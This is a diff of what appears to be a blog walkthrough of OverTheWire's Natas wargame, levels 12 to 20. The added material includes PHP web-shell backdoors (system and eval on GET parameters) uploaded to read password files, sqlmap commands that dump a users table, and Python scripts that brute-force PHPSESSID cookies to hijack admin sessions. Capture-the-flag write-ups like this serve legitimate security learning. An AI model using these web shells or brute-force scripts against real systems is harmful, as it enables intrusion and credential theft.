@@ -111,16 +111,19 @@ Display the form, replace the extension of `filename` to `.php` and upload our P
 
 💦💦💦💦💦
 
-Let's hack! Inject a classic backdoor:
+Let's hack! Inject a classic shell backdoor:
 ```html
 <pre><?php system($_GET['backdoor']); ?></pre>
 ```
 [http://natas12.natas.labs.overthewire.org/upload/pqpeihbpm7.php?backdoor=cat%20/etc/natas_webpass/natas13](http://natas12.natas.labs.overthewire.org/upload/pqpeihbpm7.php?backdoor=cat%20/etc/natas_webpass/natas13) gives `jmLTY0qiPZBbaKc9341cqPQZBJv7MQbY`.
 
 
-We can also display other people's solutions: [http://natas12.natas.labs.overthewire.org/upload/pqpeihbpm7.php?backdoor=ls -alh](http://natas12.natas.labs.overthewire.org/upload/pqpeihbpm7.php?backdoor=ls -alh)
+We can also display other people's solutions: [http://natas12.natas.labs.overthewire.org/upload/000_floriancourgey_com_backdoor.php?backdoor=ls -alh](http://natas12.natas.labs.overthewire.org/upload/000_floriancourgey_com_backdoor.php?backdoor=ls -alh)
 
 ![](/assets/images/2018/12/overthewire-natas12-php-injection-list-solutions.jpg)
+
+Or eval PHP code with `<pre><?php eval($_GET['backdoor_eval']); ?></pre>`
+[http://natas12.natas.labs.overthewire.org/upload/ctu6g7y59k.php?backdoor_eval=phpinfo();](http://natas12.natas.labs.overthewire.org/upload/ctu6g7y59k.php?backdoor_eval=phpinfo();)
 
 ### Level 13 - File upload with `exif_imagetype()` security
 ```
@@ -189,7 +192,7 @@ SELECT * from users
 
 `Successful login! The password for natas15 is AwWj0w5cvxrZiONgZ9J5stNVkmxdk39J`
 
-### Level 15 - SQL enumerqtion with `sqlmap`
+### Level 15 - SQL enumeration with `sqlmap`
 ```
 http://natas15.natas.labs.overthewire.org/ natas15 AwWj0w5cvxrZiONgZ9J5stNVkmxdk39J
 ```
@@ -275,14 +278,132 @@ Current pwd "8Ps3H0GWbn5rd9S7GmAdgQNdkhPkq9cw"
 `8Ps3H0GWbn5rd9S7GmAdgQNdkhPkq9cw`
 
 ### Level 17 - SQL enumeration 2
+```
+http://natas17.natas.labs.overthewire.org/ natas17 8Ps3H0GWbn5rd9S7GmAdgQNdkhPkq9cw
+```
+
 ```bash
 $ ./sqlmap.py --auth-cred="natas17:8Ps3H0GWbn5rd9S7GmAdgQNdkhPkq9cw" --auth-type=BASIC -u 'http://natas17.natas.labs.overthewire.org/index.php?username=' --level 3 --dbms='MySQL 5.5' -p username --technique T --dbs
 available databases [2]:
 [*] information_schema
 [*] natas17
+$ ./sqlmap.py --auth-cred="natas17:8Ps3H0GWbn5rd9S7GmAdgQNdkhPkq9cw" --auth-type=BASIC -u "http://natas17.natas.labs.overthewire.org/index.php?username=natas17" --level 3 --dbms="MySQL 5.5" -p username --technique T -D natas17 -T users -C username,password --dump
+Database: natas17
+Table: users
+[4 entries]
++----------+----------------------------------+
+| username | password                         |
++----------+----------------------------------+
+| user1    | 0xjsNNjGvHkb7pwgC6PrAyLNT0pYCqHd |
+| user2    | MeYdu6MbjewqcokG0kD4LrSsUZtfxOQ2 |
+| user3    | VOFWy9nHX9WUMo9Ei9WVKh8xLP1mrHKD |
+| natas18  | xvKIqDjy4OPv7wCRgDlmj0pFsCsDjhdP |
++----------+----------------------------------+
+```
+The password for level 18 is `xvKIqDjy4OPv7wCRgDlmj0pFsCsDjhdP`.
 
+### Level 18 - `PHPSESSID` spoofing
+```
+http://natas1.natas.labs.overthewire.org/ natas xvKIqDjy4OPv7wCRgDlmj0pFsCsDjhdP
 ```
 
+Each in PHP is given an id and then stored in a file on the server, typically for PHP 5 `/var/lib/php5/sessions/sess_{session_id}`. On the client side, the id is stored in a cookie named `PHPSESSID`. Ids commonly are a set of alphanumeric char. But here it seems they only go from 0 to 640. So we can use some bruteforce.
+
+```python
+#! /usr/bin/env python3
+import requests
+
+baseUrl = 'http://natas18.natas.labs.overthewire.org/index.php'
+for i in range(0, 640):
+    print('Current i='+str(i))
+    r = requests.get(baseUrl, auth=('natas18', 'xvKIqDjy4OPv7wCRgDlmj0pFsCsDjhdP'), cookies={'PHPSESSID':str(i)})
+    if 'You are an admin' in r.text:
+        print('admin found for i='+str(i))
+        break;
+```
+Terminal output:
+```
+Current i=117
+Current i=118
+Current i=119
+admin found for i=119
+```
+Change your cookie PHPSESSID to 119 and get the password:
+```
+You are an admin. The credentials for the next level are:
+Username: natas19
+Password: 4IwIrekcuZlA9OsjOkoUtwU6lhokCPYs
+```
+
+The password for the level 19 is `4IwIrekcuZlA9OsjOkoUtwU6lhokCPYs`.
+
+Reference:
+- http://ha.xxor.se/2011/09/local-session-poisoning-in-php-part-1.html (not directly related but good to know)
+
+### Level 19 -
+```
+http://natas19.natas.labs.overthewire.org/ natas19 4IwIrekcuZlA9OsjOkoUtwU6lhokCPYs
+```
+
+Send `aaa` in the username field and check your cookie value. Sounds like a base64 encoded string. Try it in a script with `for i in range(0,5)` and add an `a` each time. *See [natas19-discovery.py](/assets/overthewire/natas19-discovery.py)* for source code
+
+```bash
+$ ./natas19.py
+a               3234312d61          # 241-a
+aa              3433302d6161        # 430-aa
+aaa             38372d616161        # 87-aaa
+aaaa            3539342d61616161    # 594-aaaa
+aaaaa           3339352d6161616161  # 395-aaaaa
+$ ./natas19.py
+a               3336382d61          # 368-a
+aa              3630362d6161        # 606-aa
+aaa             3330362d616161      # 306-aaa
+aaaa            3234302d61616161    # 240-aaaa
+aaaaa           34352d6161616161    # 45-aaaaa
+```
+
+So we have `{random_int}-{username}`. Chances are pretty high that the username is set to admin. So we have to execute the same bruteforce: `{bruteforce_here}-admin`.
+
+```python
+#! /usr/bin/env python3
+import requests
+import binascii
+
+baseUrl = 'http://natas19.natas.labs.overthewire.org/index.php'
+for i in range(0, 640):
+    PHPSESSID = str(i)+'-admin'
+    print('Sending '+PHPSESSID+' => ', end='')
+    PHPSESSID = binascii.hexlify(str.encode(PHPSESSID)).decode()
+    print(PHPSESSID)
+    r = requests.get(baseUrl, auth=('natas19', '4IwIrekcuZlA9OsjOkoUtwU6lhokCPYs'), cookies={'PHPSESSID':PHPSESSID})
+    if 'You are logged in as a regular user' not in r.text:
+        break
+```
+
+Output:
+```
+Sending 278-admin => 3237382d61646d696e
+Sending 279-admin => 3237392d61646d696e
+Sending 280-admin => 3238302d61646d696e
+Sending 281-admin => 3238312d61646d696e
+```
+
+> See [natas19-bruteforce.py](/assets/overthewire/natas19-bruteforce.py) for source code
+
+Change you cookie value to `3238312d61646d696e` and you're all set!
+```
+You are an admin. The credentials for the next level are:
+Username: natas20
+Password: eofm3Wsshxc5bwtVnEuGIlr7ivb9KABF
+```
+
+The password for the level 20 is `eofm3Wsshxc5bwtVnEuGIlr7ivb9KABF`.
+
+### Level 20 -
+```
+http://natas20.natas.labs.overthewire.org/ natas20 eofm3Wsshxc5bwtVnEuGIlr7ivb9KABF
+```
+``
 
 ### Level  -
 ```
